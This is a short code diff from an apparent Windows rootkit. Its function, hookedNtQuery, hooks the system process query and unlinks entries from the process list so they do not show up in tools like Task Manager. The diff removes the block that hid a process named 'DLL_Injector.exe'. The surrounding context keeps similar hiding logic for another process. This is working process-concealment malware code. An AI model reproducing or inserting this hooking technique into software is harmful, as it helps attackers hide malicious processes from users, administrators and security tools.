@@ -35,15 +35,7 @@ NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, P
                 }
                 curr = prev;
             }
-            if (!lstrcmp(curr->ImageName.Buffer, L"DLL_Injector.exe")) {
-                if (curr->NextEntryOffset == 0) {
-                    prev->NextEntryOffset = 0;
-                }
-                else {
-                    prev->NextEntryOffset += curr->NextEntryOffset;
-                }
-                curr = prev;
-            }
+            
             prev = curr;
             curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
         }
